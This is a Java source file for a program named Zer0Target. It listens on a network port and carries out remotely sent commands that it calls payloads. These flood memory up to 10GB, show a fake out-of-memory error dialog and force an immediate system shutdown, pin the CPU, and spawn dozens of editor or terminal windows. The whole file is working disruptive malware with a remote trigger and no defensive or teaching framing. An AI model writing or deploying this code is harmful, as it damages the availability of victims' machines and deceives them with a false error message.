import java.io.*;
import java.net.*;
import java.util.*;
import javax.swing.JOptionPane;

public class Zer0Target {
    private static final List<Thread> activeThreads = new ArrayList<>();

    public static void main(String[] args) {
        int port = 6666;
        if (args.length > 0) {
            try {
                port = Integer.parseInt(args[0]);
            } catch (NumberFormatException e) {
                System.err.println("[Zer0Target] Invalid port. Using default 6666.");
            }
        }

        System.out.println("[Zer0Target] Listening on port " + port);

        try (ServerSocket serverSocket = new ServerSocket(port)) {
            while (true) {
                Socket socket = serverSocket.accept();
                new Thread(() -> handleClient(socket)).start();
            }
        } catch (IOException e) {
            System.err.println("[Zer0Target] Server error: " + e.getMessage());
        }
    }

    private static void handleClient(Socket socket) {
        try (
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))
        ) {
            String command = in.readLine();
            System.out.println("[Zer0Target] Received: " + command);

            switch (command.toUpperCase()) {
                case "RAMFLOOD":
                    Thread ramThread = new Thread(Zer0Target::ramFlood);
                    ramThread.start();
                    activeThreads.add(ramThread);
                    break;
                case "CPUBURN":
                    Thread cpuThread = new Thread(Zer0Target::cpuBurn);
                    cpuThread.start();
                    activeThreads.add(cpuThread);
                    break;
                case "SPAM":
                    new Thread(Zer0Target::processSpam).start();
                    break;
                case "STOP":
                    stopAllPayloads();
                    break;
                default:
                    System.out.println("[Zer0Target] Unknown command.");
            }
        } catch (IOException e) {
            System.err.println("[Zer0Target] Client error: " + e.getMessage());
        }
    }

    private static void ramFlood() {
    System.out.println("[Zer0Target] RAM flood started.");
    List<byte[]> memoryHog = new ArrayList<>();
    final int maxChunks = 10240;

    try {
        for (int i = 0; i < maxChunks && !Thread.currentThread().isInterrupted(); i++) {
            memoryHog.add(new byte[100 * 1024 * 1024]);
            Thread.sleep(10);
        }
        System.out.println("[Zer0Target] Reached 10GB cap. Holding memory.");
        showOutOfMemoryMessage();
    } catch (OutOfMemoryError e) {
        System.err.println("[Zer0Target] OutOfMemoryError caught.");
        showOutOfMemoryMessage();
    } catch (InterruptedException e) {
        System.out.println("[Zer0Target] RAM flood stopped.");
    } catch (Exception ex) {
        System.err.println("[Zer0Target] Exception in ramFlood: " + ex.getMessage());
    }
}

	private static void showOutOfMemoryMessage() {
		JOptionPane.showMessageDialog(null,
				"System has ran out of physical memory.",
				"Memory Error",
				JOptionPane.ERROR_MESSAGE);

    try {
        Runtime.getRuntime().exec("shutdown -s -t 0");
    } catch (Exception ex) {
        System.err.println("[Zer0Target] Failed to shutdown system: " + ex.getMessage());
    }
}


    private static void cpuBurn() {
        System.out.println("[Zer0Target] CPU burn started.");
        try {
            while (!Thread.currentThread().isInterrupted()) {
                Math.pow(Math.random(), Math.random());
            }
        } catch (Exception e) {
            System.out.println("[Zer0Target] CPU burn interrupted.");
        }
    }

    private static void processSpam() {
        System.out.println("[Zer0Target] Process spam initiated.");
        String os = System.getProperty("os.name").toLowerCase();
        String command = os.contains("win") ? "notepad" : os.contains("mac") ? "open -a TextEdit" : "xterm";

        try {
            for (int i = 0; i < 50; i++) {
                Runtime.getRuntime().exec(new String[]{command});
                Thread.sleep(100);
            }
        } catch (IOException | InterruptedException e) {
            System.err.println("[Zer0Target] Process spam error: " + e.getMessage());
        }
    }

    private static void stopAllPayloads() {
        System.out.println("[Zer0Target] Killing all active payloads...");
        for (Thread t : activeThreads) {
            t.interrupt();
        }
        activeThreads.clear();
    }
}
